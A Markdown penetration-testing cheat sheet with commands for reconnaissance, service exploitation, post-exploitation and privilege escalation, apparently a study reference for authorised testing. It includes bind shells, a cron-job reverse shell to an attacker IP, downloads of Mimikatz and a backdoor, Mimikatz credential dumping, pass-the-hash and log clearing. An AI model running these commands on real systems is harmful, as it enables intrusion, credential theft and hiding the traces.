# 5 Phases of Pentesting

## Table of Contents
1. [Information Gathering](#information-gathering)
    - [Whois](#whois)
    - [DNS Enumeration](#dns-enumeration)
    - [Subdomain Enumeration](#subdomain-enumeration)
    - [Website Recon](#website-recon)
    - [All-in-One Tools](#all-in-one-tools)
    - [Host Discovery](#host-discovery)
    - [Port Scanning](#port-scanning)
2. [Network Services Exploitation](#network-services-exploitation)
    - [FTP (Port 21)](#ftp-port-21)
    - [SSH (Port 22)](#ssh-port-22)
    - [SMTP (Port 25)](#smtp-port-25)
    - [WebDav (Port 80)](#webdav-port-80)
    - [PHP](#php)
    - [SMB / Samba (Ports 139/445)](#smb-samba-ports-139445)
    - [MySQL (Port 3306)](#mysql-port-3306)
    - [RDP (Port 3389)](#rdp-port-3389)
    - [WinRM (Ports 5985, 5986)](#winrm-ports-5985-5986)
    - [Other Ports](#other-ports)
3. [Post-Exploitation](#post-exploitation)
    - [General Techniques](#general-techniques)
    - [Windows Post-Exploitation](#windows-post-exploitation)
    - [Linux Post-Exploitation](#linux-post-exploitation)
4. [Privilege Escalation](#privilege-escalation)
    - [Windows Privilege Escalation](#windows-privilege-escalation)
    - [Linux Privilege Escalation](#linux-privilege-escalation)
5. [Resources](#resources)

## Information Gathering

### Whois
- **Whois Protocol**: Used for querying databases that store registered users or assignees of an Internet resource.
    ```sh
    whois linux.com
    ```

### DNS Enumeration

#### Manual
- List IPv4 addresses:
    ```sh
    dig +short a zonetransfer.me
    ```
- List email servers:
    ```sh
    dig +short mx zonetransfer.me
    ```
- Reverse lookups:
    ```sh
    dig +short -x 192.246.126.3
    ```
- List DNS servers for the domain:
    ```sh
    dig +short ns zonetransfer.me
    ```
- Zone transfer attack:
    ```sh
    dig axfr zonetransfer.me @nsztm1.digi.ninja.
    ```

#### Automatic
- Tools: dnsdumpster.com, dnsrecon

### Subdomain Enumeration
- **Sublist3r**: Enumerates subdomains using search engines and DNSdumpster.
    ```sh
    sublist3r -d website.com
    ```

### Website Recon

#### Web App Technology Fingerprinting
- Extensions: wappalyzer, builtwith
- Command:
    ```sh
    whatweb website.com
    ```

#### Look for Hidden Directories/Files
- Check robots.txt and sitemap.xml:
    ```sh
    http://website.com/robots.txt
    http://website.com/sitemap.xml
    ```

#### WAF Detection
- Using wafw00f:
    ```sh
    wafw00f http://website.com -a
    ```

#### Download Website Source
- Tool: httrack

#### Google Dorks
- Dorking operators: site, filetype, inurl, intitle, cache
- Resource: exploit-db.com/google-hacking-database

#### Wayback Machine
- Check historical data:
    ```sh
    web.archive.org
    ```

### All-in-One Tools
- **amass**: Network mapping and external asset discovery.
- **sitereport.netcraft.com**: Provides detailed information about a domain.
- **theHarvester**: Gathers names, emails, IPs, subdomains, and URLs using public resources.
    ```sh
    theHarvester -d example.com -b google,linkedin,dnsdumpster,duckduckgo
    ```

### Host Discovery

#### Using nmap
- ICMP echo request:
    ```sh
    nmap -sn 192.168.1.0/24
    ```
- SYN flag set (default port 80):
    ```sh
    nmap -sn -PS 192.168.1.5
    ```
- Other options:
    - ACK flag set:
        ```sh
        nmap -sn -PA 192.168.1.5
        ```
    - UDP packet (default port 40125):
        ```sh
        nmap -sn -PU 192.168.1.5
        ```
    - SCTP packet (default port 80):
        ```sh
        nmap -sn -PY 192.168.1.5
        ```

### Port Scanning

#### Using nmap
- Scan all TCP ports:
    ```sh
    nmap -p- 192.168.1.5
    ```
- UDP scan:
    ```sh
    nmap -sU --top-ports 25 <ip>
    ```

#### Script Engine
- Default script scan:
    ```sh
    nmap -sC
    ```
- Load specific scripts:
    ```sh
    nmap --script "default or safe"
    ```

## Network Services Exploitation

### FTP (Port 21)
- Connect to FTP server:
    ```sh
    ftp <ip>
    ```
- Check anonymous login:
    ```sh
    user: anonymous, password: <blank>
    ```
- Brute force login
- Search exploit for vulnerable version

### SSH (Port 22)
- Connect to SSH:
    ```sh
    ssh <username>@<ip>
    ```
- Brute force login
- Search exploit for vulnerable version

### SMTP (Port 25)
- Search exploit for vulnerable version
- Retrieve the hostname of the server:
    ```sh
    nc <ip> <port>
    helo whatyouwant
    ```

#### Username Bruteforce
- Automation:
    ```sh
    smtp-user-enum -U <directory_path> -t <ip>
    ```
- Manual:
    ```sh
    nc <ip> <port>
    VRFY root
    ```

### WebDav (Port 80)
- Automate file upload and execution:
    - **davtest**:
        ```sh
        davtest -auth <user>:<password> -url http://<ip>/<webdav_path>
        davtest --url http://<ip>/<webdav_path> -auth <user>:<password> -uploadfile /path/to/webshell.asp -uploadloc /destination/webshell.asp
        ```
    - **cadaver**:
        ```sh
        cadaver http://<ip>/<webdav_path>
        ```

### PHP
- Famous exploit: php_cgi_arg_injection (up to version 5.3.12 and 5.4.2)

### SMB / Samba (Ports 139/445)
- List shared folders:
    ```sh
    smbclient --no-pass -L //<ip>
    smbclient -U 'username[%passwd]' -L //<ip>
    ```
- Obtain Information:
    ```sh
    enum4linux -a [-u "<username>" -p "<passwd>"] <ip>
    ```
- Command execution (authenticated):
    ```sh
    smbmap -H <ip> -u <user> -p <pass> -x 'ipconfig'
    ```
- Brute force login
- Search exploit for vulnerable version
- Check for SMBv1 and use EternalBlue exploit

### MySQL (Port 3306)
- Connect to MySQL:
    ```sh
    mysql -h <hostname> -u root
    mysql -h <hostname> -u root -p
    ```
- Brute force login

### RDP (Port 3389)
- Connect to RDP:
    ```sh
    xfreerdp /v:<ip> /u:<username> /p:<password>
    ```
- Brute force login
- Search exploit for vulnerable version

### WinRM (Ports 5985, 5986)
- Try using the username as the password
- Brute force login

### Other Ports
- Banner grabbing with Netcat:
    ```sh
    netcat <ip> <port>
    ```

## Post-Exploitation

### General Techniques

#### Bind Shell
- Windows (target):
    ```sh
    nc -nvlp <PORT> -e cmd.exe
    ```
- Linux (target):
    ```sh
    nc -nvlp <PORT> -e /bin/bash
    ```
- Linux (attacker):
    ```sh
    nc -nv <IP> <PORT>
    ```
- Windows (attacker):
    ```sh
    nc.exe -nv <IP> <PORT>
    ```

#### Transfer Files
- Windows:
    ```sh
    certutil -urlcache -f http://<host>/mimikatz.exe mimikatz.exe
    ```
- Linux:
    ```sh
    wget http://<host>/backdoor.php
    ```
- Netcat:
    ```sh
    nc -nvlp 123

4 > test.txt
    nc -nv <ip> <port> < test.txt
    ```

#### Interactive Shell
- Linux:
    ```sh
    /bin/bash -i
    ```

#### Fully Interactive Shell
- Python:
    ```sh
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    ```

### Keylogger
- Metasploit:
    ```sh
    keyscan_start
    keyscan_dump
    ```

### Pivoting
- Metasploit (in meterpreter):
    ```sh
    run autoroute -s <subnet>
    run autoroute -p
    ```

### Port Forwarding
- Metasploit:
    ```sh
    portfwd add -l 1234 -p 80 -r <target_sys_2_ip>
    portfwd list
    nmap -sV -sC -p 1234 localhost
    ```

## Windows Post-Exploitation

### Persistence
- Metasploit:
    ```sh
    search persistence module (Windows)
    ```
- Enable RDP:
    ```sh
    run getgui -e -u user_you_want -p password_you_want
    ```

### Clearing Tracks
- Metasploit/Meterpreter:
    ```sh
    clearev
    ```

## Linux Post-Exploitation

### Persistence
- Metasploit:
    ```sh
    search persistence module (Linux)
    ```
- Via SSH key:
    ```sh
    transfer SSH private key to local machine and use it to connect via SSH
    ```
- With cron jobs:
    ```sh
    echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'" > cron
    crontab -i cron
    crontab -l
    ```

### Clearing Tracks
- Linux:
    ```sh
    history -c
    cat /dev/null > ~/.bash_history
    ```

## Privilege Escalation

### Windows Privilege Escalation

#### Automation Script
- PrivescCheck:
    ```sh
    powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
    ```

#### UAC Bypass
- UACME:
    ```sh
    Akagi64.exe 23 <payload_full_path>
    ```

#### Impersonate Tokens
- Metasploit:
    ```sh
    load incognito
    list_tokens -u
    impersonate_token <token_name>
    ```

#### Password in Configuration File
- Unattend.xml locations:
    ```sh
    C:\unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.xml
    C:\Windows\system32\sysprep\sysprep.xml
    ```

#### Credential Dumping
- Mimikatz/Kiwi:
    ```sh
    privilege::debug
    lsa_dump_sam
    sekurlsa::logonpasswords
    ```

#### Pass the Hash
- CrackMapExec:
    ```sh
    crackmapexec smb <ip> -u <administrator> -H <NTLM hash> -x "ipconfig"
    ```

### Linux Privilege Escalation

#### Vulnerable Programs
- Search for vulnerable versions (e.g., chkrootkit v0.49)

#### Weak Permissions
- World-writable files:
    ```sh
    find / -not -type l -perm -o+w
    ```

#### Sudo
- Check sudo privileges:
    ```sh
    sudo -l
    ```

#### SUID - Custom Binary
- Look for shared libraries or binaries being loaded/executed at runtime:
    ```sh
    strings binary_name
    ```

#### Other Techniques
- Check for capabilities, history files, docker group, cron jobs, SSH keys, PATH, NFS, writable /etc/shadow or /etc/passwd

## Resources

- **Juggernaut Security Blog**: [juggernaut-sec.com/blog/](https://juggernaut-sec.com/blog/)
- **GTFOBins**: [gtfobins.github.io](https://gtfobins.github.io)
- **PEASS-ng (linPEAS)**: [github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- **pspy**: [github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)
- **Priv2Admin**: [github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
